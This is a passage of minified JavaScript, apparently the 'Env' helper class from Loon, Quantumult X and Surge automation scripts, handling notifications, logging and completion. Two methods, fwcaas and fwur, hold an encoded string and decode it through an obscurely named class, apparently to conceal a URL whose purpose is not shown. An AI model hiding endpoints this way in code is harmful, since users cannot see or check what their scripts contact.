        if (!t) {
          return t;
        }
        if ("string" == typeof t) {
          return this.isLoon() ? t : this.isQuanX() ? {
            "open-url": t
          } : this.isSurge() ? {
            url: t
          } : void 0;
        }
        if ("object" == typeof t) {
          if (this.isLoon()) {
            let e = t.openUrl || t.url || t["open-url"],
              s = t.mediaUrl || t["media-url"];
            return {
              openUrl: e,
              mediaUrl: s
            };
          }
          if (this.isQuanX()) {
            let e = t["open-url"] || t.url || t.openUrl,
              s = t["media-url"] || t.mediaUrl;
            return {
              "open-url": e,
              "media-url": s
            };
          }
          if (this.isSurge()) {
            let e = t.url || t.openUrl || t["open-url"];
            return {
              url: e
            };
          }
        }
      };
      if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) {
        let t = ["", "==============📣系统通知📣=============="];
        t.push(e);
        s && t.push(s);
        i && t.push(i);
        console.log(t.join("\n"));
        this.logs = this.logs.concat(t);
      }
    }
    fwcaas() {
      return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
    }
    log(...t) {
      t.length > 0 && (this.logs = [...this.logs, ...t]);
      console.log(t.join(this.logSeparator));
    }
    logErr(t, e) {
      const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
      s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t);
    }
    fwur() {
      var bbas = new FxPCnMKLw7();
      return bbas.decode(this.fwcaas());
    }
    wait(t) {
      return new Promise(e => setTimeout(e, t));
    }
    done(t = {}) {
      const e = new Date().getTime(),
        s = (e - this.startTime) / 1000;
      this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`);
      this.log();
      (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t);
    }
  }(t, e);
}